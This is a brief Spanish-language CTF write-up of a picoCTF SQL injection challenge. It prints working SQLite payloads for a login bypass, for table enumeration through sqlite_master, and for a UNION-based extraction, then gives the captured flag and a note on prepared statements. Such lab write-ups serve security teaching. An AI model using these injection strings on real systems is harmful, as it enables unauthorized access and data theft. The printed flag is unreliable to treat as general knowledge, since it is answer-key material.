## Descripción

Can you find the flag on this website:

http://saturn.picoctf.net:54879/

## Solución

- **Bypass de Login:** Se ingresó `' or 1=1;` en usuario y contraseña para forzar una condición verdadera (`TRUE`) en la consulta `WHERE` y acceder al portal.

- **Reconocimiento:** En el buscador interno se inyectó `' UNION SELECT 1, sql, 3 FROM sqlite_master WHERE type='table'; --` para listar las tablas, identificando la tabla `more_table` con la columna `flag`.

- **Extracción:** Se ejecutó `' UNION SELECT 1, flag, 3 FROM more_table; --` para desplegar la bandera en pantalla.

```
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_e3e46aae}
```

## Notas adicionales

- El fallo se debe a la concatenación directa de entradas sin usar consultas preparadas (_Prepared Statements_).

- SQLite permite mapear el esquema completo consultando la tabla del sistema `sqlite_master`.

## Referencias

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md